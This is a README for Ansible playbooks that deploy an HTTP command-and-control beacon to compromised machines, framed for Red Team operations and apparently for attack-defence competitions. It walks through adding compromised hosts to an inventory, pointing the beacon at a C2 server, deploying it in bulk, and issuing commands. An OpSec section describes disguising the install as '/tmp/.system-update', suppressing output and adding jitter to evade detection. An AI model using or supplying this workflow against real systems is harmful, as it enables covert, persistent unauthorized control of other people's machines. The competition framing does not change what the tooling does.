# Ansible Deployment for HTTP Beacon

## Overview
These Ansible playbooks automate the deployment of the HTTP beacon to compromised target systems during Red Team operations.

## Prerequisites
- Ansible installed on your attack machine
- SSH access to target systems (via password or key)
- Python3 available on targets (playbook will install if missing)

## Installation

### Install Ansible (if not already installed)
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install ansible

# macOS
brew install ansible

# pip
pip3 install ansible
```

## Configuration

### 1. Edit Inventory File
Edit `inventory.ini` to add your target systems:
```ini
[targets]
target1 ansible_host=192.168.1.101 ansible_user=ctfuser
target2 ansible_host=192.168.1.102 ansible_user=ctfuser
```

### 2. Configure C2 Server URL
Edit `deploy-beacon.yml` and set your C2 server IP:
```yaml
vars:
  c2_server_url: "http://YOUR_C2_IP:8080"
```

### 3. Authentication

**Option A: SSH Key (Recommended)**
```bash
ssh-copy-id ctfuser@192.168.1.101
```

**Option B: Password in Inventory**
```ini
[targets]
target1 ansible_host=192.168.1.101 ansible_user=ctfuser ansible_ssh_pass=password
```

**Option C: Prompt for Password**
Use `-k` flag when running playbook (see below)

## Usage

### Deploy Beacon to All Targets
```bash
ansible-playbook -i inventory.ini deploy-beacon.yml
```

### Deploy with Password Prompt
```bash
ansible-playbook -i inventory.ini deploy-beacon.yml -k
```

### Deploy to Specific Target
```bash
ansible-playbook -i inventory.ini deploy-beacon.yml --limit target1
```

### Deploy with Sudo Password
```bash
ansible-playbook -i inventory.ini deploy-beacon.yml -K
```

### Dry Run (Check Mode)
```bash
ansible-playbook -i inventory.ini deploy-beacon.yml --check
```

## Playbook Variables

You can override variables at runtime:
```bash
ansible-playbook -i inventory.ini deploy-beacon.yml \
  -e "c2_server_url=http://10.0.0.1:8080" \
  -e "check_in_interval=120"
```

Available variables:
- `c2_server_url` - C2 server address (default: http://192.168.1.100:8080)
- `beacon_install_path` - Where to install beacon (default: /tmp/.system-update)
- `check_in_interval` - Seconds between check-ins (default: 60)

## Competition Usage

### Quick Deployment Workflow
1. Compromise a system and get SSH access
2. Add system to `inventory.ini`
3. Run deployment playbook
4. Monitor C2 server for beacon check-ins
5. Issue commands through C2 interface

### Example Competition Scenario
```bash
# Just compromised web server at 10.0.5.20
echo "webserver ansible_host=10.0.5.20 ansible_user=www-data" >> inventory.ini

# Deploy beacon
ansible-playbook -i inventory.ini deploy-beacon.yml --limit webserver -k

# Check C2 server - beacon should check in within 60 seconds
```

## Troubleshooting

### Beacon Not Checking In
```bash
# Check if beacon is running on target
ansible targets -i inventory.ini -m shell -a "pgrep -af beacon.py"

# Check beacon logs (if any)
ansible targets -i inventory.ini -m shell -a "cat /tmp/.system-update/beacon.log"

# Test connectivity to C2 server from target
ansible targets -i inventory.ini -m shell -a "curl http://YOUR_C2_IP:8080"
```

### Restart Beacon
```bash
# Kill existing beacon
ansible targets -i inventory.ini -m shell -a "pkill -f beacon.py"

# Redeploy
ansible-playbook -i inventory.ini deploy-beacon.yml
```

### Remove Beacon (Cleanup)
```bash
ansible targets -i inventory.ini -m shell -a "pkill -f beacon.py"
ansible targets -i inventory.ini -m shell -a "rm -rf /tmp/.system-update"
```

## OpSec Considerations

- Beacon installed to `/tmp/.system-update` (looks like system process)
- Runs in background with no visible terminal
- No logs by default (stdout/stderr to /dev/null)
- Uses jitter to avoid predictable network patterns
- Can be configured to blend with normal traffic timing

## Security Notes

- Change default install path in production
- Use SSH keys instead of passwords
- Consider encrypting beacon communications
- Test in lab environment before competition
- Coordinate with Grey Team on acceptable actions
```